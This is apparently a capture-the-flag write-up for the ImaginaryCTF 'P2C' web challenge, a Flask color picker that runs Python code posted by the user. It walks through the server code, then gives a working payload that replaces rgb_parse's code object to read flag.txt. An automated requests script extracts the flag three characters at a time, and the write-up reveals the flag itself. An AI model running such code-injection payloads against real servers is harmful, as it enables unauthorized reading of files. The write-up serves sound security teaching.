# Web/P2C

## Description

Welcome to Python 2 Color, the world's best color picker from python code!

The flag is located in flag.txt.

**Attachments**: [p2c_release.zip](p2c_release.zip)

## Challenge Overview

app.py

```py
from flask import Flask, request, render_template
import subprocess
from random import randint
from hashlib import md5
import os
import re

app = Flask(__name__)

def xec(code):
    code = code.strip()
    indented = "\n".join(["    " + line for line in code.strip().splitlines()])

    file = f"/tmp/uploads/code_{md5(code.encode()).hexdigest()}.py"
    with open(file, 'w') as f:
        f.write("def main():\n")
        f.write(indented)
        f.write("""\nfrom parse import rgb_parse
print(rgb_parse(main()))""")

    os.system(f"chmod 755 {file}")

    try:
        res = subprocess.run(["sudo", "-u", "user", "python3", file], capture_output=True, text=True, check=True, timeout=0.1)
        output = res.stdout
    except Exception as e:
        output = None

    os.remove(file)

    return output

@app.route('/', methods=["GET", "POST"])
def index():
    res = None
    if request.method == "POST":
        code = request.form["code"]
        res = xec(code)
        valid = re.compile(r"\([0-9]{1,3}, [0-9]{1,3}, [0-9]{1,3}\)")
        if res == None:
            return render_template("index.html", rgb=f"rgb({randint(0, 256)}, {randint(0, 256)}, {randint(0, 256)})")
        if valid.match("".join(res.strip().split("\n")[-1])):
            return render_template("index.html", rgb="rgb" + "".join(res.strip().split("\n")[-1]))
        return render_template("index.html", rgb=f"rgb({randint(0, 256)}, {randint(0, 256)}, {randint(0, 256)})")
    return render_template("index.html", rgb=f"rgb({randint(0, 256)}, {randint(0, 256)}, {randint(0, 256)})")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
```

We are given a simple flask application. Here it has only a single route `/`. When we send a `POST` to `/` with the `code` value set, it goes on to execute `xec(code)`.

```py
def xec(code):
    code = code.strip()
    indented = "\n".join(["    " + line for line in code.strip().splitlines()])

    file = f"/tmp/uploads/code_{md5(code.encode()).hexdigest()}.py"
    with open(file, 'w') as f:
        f.write("def main():\n")
        f.write(indented)
        f.write("""\nfrom parse import rgb_parse
print(rgb_parse(main()))""")

    os.system(f"chmod 755 {file}")

    try:
        res = subprocess.run(["sudo", "-u", "user", "python3", file], capture_output=True, text=True, check=True, timeout=0.1)
        output = res.stdout
    except Exception as e:
        output = None

    os.remove(file)

    return output
```

The `xec(code)` function simply creates a python file inside `/tmp/uploads/` whose contents is

```py
def main():
    # Our code
from parse import rgb_parse
print(rgb_parse(main()))
```

Next it executes the this python program and the output returned by this program is stored inside `output`. It then removes this python file and returns `output`.

Then a regex expression inside the `index()` is used to to check that the output of `xec(code)` is of the format `(9-255,1-255,0-255)` which means it must be a rgb color and then it simply renders the `index.html` template with `rgb` set to this value that returned.

In case the regex fails, it renders `index.html` with some random rgb value.

This means whatever `code` we send is executed on the server. So we could potentially just import `os` and run commands on the system but that actually won't help us actually as we do not have a way to read the output. And also sending the output to ourselves using `requests`, `curl` or something similar also won't be possible because of the very short timeout.

We are also given `parse.py` which contains the `rgb_parse()` function. Let us try to analyze it.

parse.py

```py
import sys

if "random" not in dir():
   import random

def rgb_parse(inp=""):
   inp = str(inp)
   randomizer = random.randint(100, 1000)
   total = 0
   for n in inp:
      n = ord(n)
      total += n+random.randint(1, 10)
   rgb = total*randomizer*random.randint(100, 1000)
   rgb = str(rgb%1000000000)
   r = int(rgb[0:3]) + 29
   g = int(rgb[3:6]) + random.randint(10, 100)
   b = int(rgb[6:9]) + 49
   r, g, b = r%256, g%256, b%256
   return r, g, b
```

The function `rgb_parse()` takes an input `inp` (which is the output of our `main()`) and then by manipulating it generates a random rgb color value. This is then set in `index.html`.

## Exploit

I had already tried sending the exploit by using `curl`, `requests` etc. but it would not work due to the timeout. Another approach was that we could create our own `random.py` file and then implement our own `randint` function so that the rgb values won't be random anymore and then it would be possible to guess the flag using the rgb values. But this exploit only worked locally for me (no idea why it didn't work on the server).

Finally this is what worked.

```py
def main():
    from parse import rgb_parse
    def new(text):
        with open("flag.txt", "r") as f:
            flag = f.read()
            return ord(flag[0]), ord(flag[1]), ord(flag[2])
    rgb_parse.__code__ = new.__code__
    return "code"
from parse import rgb_parse
print(rgb_parse(main()))
```

`rgb_parse.__code__ = new.__code__` modifies the `rgb_parse` funciton to our `new` that we defined. With this we could find all the characters of the flag using the rgb values.

exploit.py

```py
import requests

baseURL = 'http://p2c.chal.imaginaryctf.org/'
def pythonCode(code):
    url = baseURL
    sendData = {"code": code}
    r = requests.post(url, data=sendData)
    return r

flag = ""
for i in range(0, 33, 3):

    exploit = f"""
from parse import rgb_parse
def new(text):
    with open("flag.txt", "r") as f:
        flag = f.read()
        return ord(flag[{i}]), ord(flag[{i+1}]), ord(flag[{i+2}])
rgb_parse.__code__ = new.__code__
return "code"
"""
    res = pythonCode(exploit).text
    res = res.split('changeBackgroundColor("rgb')
    res = res[1]
    res = res.split('");')
    res = eval(res[0])
    flag += chr(res[0]) + chr(res[1]) + chr(res[2])
    print(flag)

print(flag)
```

Running this gives our flag `ictf{d1_color_picker_fr_2ce0dd3d}`.